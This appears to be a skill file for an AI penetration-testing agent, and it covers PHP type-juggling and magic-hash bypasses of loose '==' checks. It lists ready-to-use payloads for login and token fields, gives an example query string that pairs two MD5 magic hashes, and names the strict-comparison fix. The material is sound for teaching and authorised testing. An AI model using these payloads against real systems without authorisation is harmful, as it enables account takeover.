---
name: type-juggling
description: >-
  PHP type juggling and weak comparison (`==`) bypass. Use when authentication, HMAC/signature checks, or token validation uses loose equality, numeric coercion, or hash comparisons without strict types — common in legacy PHP and CTF-style code paths.
---

# SKILL: PHP Type Juggling — Weak Comparison & Magic Hash Bypass

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: PHP `==` coercion, magic hashes (`0e…`), HMAC/hash loose checks, NULL from bad types, and CTF-style `strcmp` / `json_decode` / `intval` tricks. Use strict routing: map the sink (`==` vs `hash_equals`), PHP major version, and whether both operands are attacker-controlled. Routing note: when you encounter PHP login/signature logic or code like `md5($_GET['x'])==md5($_GET['y'])`, start with this skill; if `hash_equals`/`===` is already used, this path usually does not apply.

## 0. QUICK START

**First-pass goal**: prove the server branch treats unequal secrets/tokens as equal via coercion, not guess the real password.

### First-pass payloads (auth / token shape)

```text
password[]=x
password=
0
0e12345
240610708
QNKCDZO
true
[]
{"password":true}
admin%00
```

### Minimal PHP probes (local or `php -r` in lab)

```php
<?php
// Loose compare probes — run in target PHP major version if possible
var_dump('0e123' == '0e999');
var_dump('123a' == 123);
var_dump(md5('240610708') == md5('QNKCDZO'));
```

### Routing hints

| Clue | Next step |
|---|---|
| Source code uses `==` to compare passwords, tokens, or HMAC values | Go to Sections 1-3 |
| `md5($a) == md5($b)` or loose `sha1` comparison | Section 2 magic hashes |
| `hash_hmac(...) != '0'` or compared with `"0"` | Section 3 |
| `strcmp`、`json_decode(..., true)`、`intval` | Section 5 |

---

## 1. LOOSE COMPARISON (`==`) — TRUTH TABLE & VERSIONS

PHP compares operands with type juggling unless you use `===` or `hash_equals()` for secrets.

### 1.1 Core examples (strings vs numbers)

| Expression | Result | Mechanism (short) |
|---|---|---|
| `'0010e2' == '1e3'` | **true** | Both strings look numeric → compared as **floats**; both parse to **1000.0** (not zero — common exam trap; see next row for real “both zero”) |
| `'0e462097431906509019562988736854' == '0e830400451993494058024219903391'` | **true** | Both parse as **0.0** in scientific notation |
| `'123a' == 123` | **true** | String cast to int stops at first non-digit → `123` |
| `'abc' == 0` | **true** (PHP **7.x and earlier**) | Non-numeric string compared to int → string becomes `0` |
| `'' == 0` | **true** | Empty string → `0` |
| `'' == false` | **true** | both “falsy” in loose rules |
| `false == NULL` | **true** | loose equality |
| `0 == false` | **true** | loose equality |
| `'' == 0 == false == NULL` | **true** (chain) | Each adjacent pair is **true** under `==` (`''==0`, `0==false`, `false==NULL`) — classic “falsy” chain |
| `'0' == false` | **true** | String `'0'` is the **only** non-empty string that compares as false to boolean |
| `'php' == 0` | **false** (PHP **8+**) | PHP 8: non-numeric string **no longer** equals `0` |

### 1.2 PHP 5 vs 7 vs 8 (high-signal deltas)

| Topic | PHP 5.x / 7.x (typical) | PHP 8.0+ |
|---|---|---|
| `0 == "foo"` | **true** (string → 0) | **false** |
| String-to-number for `"123a"` | Still truncates for `(int)` / numeric compare in many `==` paths | Same idea for numeric strings; **non-numeric** vs int fixed as above |
| `md5([])` / `sha1([])` | May warn / `NULL`-like behavior in older patterns | **TypeError** for wrong types — kills classic `[]` tricks unless error handling collapses to NULL |

**Tester takeaway**: always note **PHP version** from headers, `X-Powered-By`, or fingerprint; a payload that works on PHP 7 may fail on PHP 8.

### 1.3 Safe alternative (defense / verification)

```php
hash_equals((string)$expected, (string)$actual);  // timing-safe, strict string
// or
$expected === $actual;
```

---

## 2. MAGIC HASHES (`0e…` + digits only)

When both sides are **hex-looking hash strings** that match `^0e[0-9]+$`, PHP treats them as **floats in scientific notation** → value **0.0**. Then `md5(A) == md5(B)` is **true** even though digests differ as strings.

### 2.1 Reference table (MD5 / SHA-1 and longer algos)

| Algorithm | Example input | Digest (starts with `0e` + all decimal digits) |
|---|---|---|
| **MD5** | `240610708` | `0e462097431906509019562988736854` |
| **MD5** | `QNKCDZO` | `0e830400451993494058024219903391` |
| **SHA-1** | `10932435112` | `0e07766915004133176347055865026311692244` |
| **SHA-224** | *(brute-force / precomputed)* | Example form: `0e` + decimal digits only → `==` with another such string is true |
| **SHA-256** | *(brute-force / precomputed)* | Same pattern: only strings matching `^0e\d+$` collide under `==` |

**Why it works**: `md5('240610708') == md5('QNKCDZO')` → both sides match `^0e[0-9]+$` → both interpreted as **0.0 == 0.0** → **true**.

### 2.2 Exploit pattern in code

```php
if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']) {
    // intended: different strings, same md5 (impossible for md5)
    // actual: two different strings whose *digests* are magic hashes
}
```

### 2.3 Payload sketch (pair hunting)

```text
?a=240610708&b=QNKCDZO
```

For SHA-224/256, treat as **search problem**: brute-force inputs until digest matches `^0e\d+$`; pair two distinct inputs. Longer hashes = harder; MD5/SHA1 examples above are the usual teaching set.

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 3. HMAC BYPASS (LOOSE COMPARE VS `"0"` OR `0`)
- 4. NULL JUGGLING (ARRAYS & TYPE ERRORS)
- 5. CTF PATTERNS
- 6. DECISION TREE
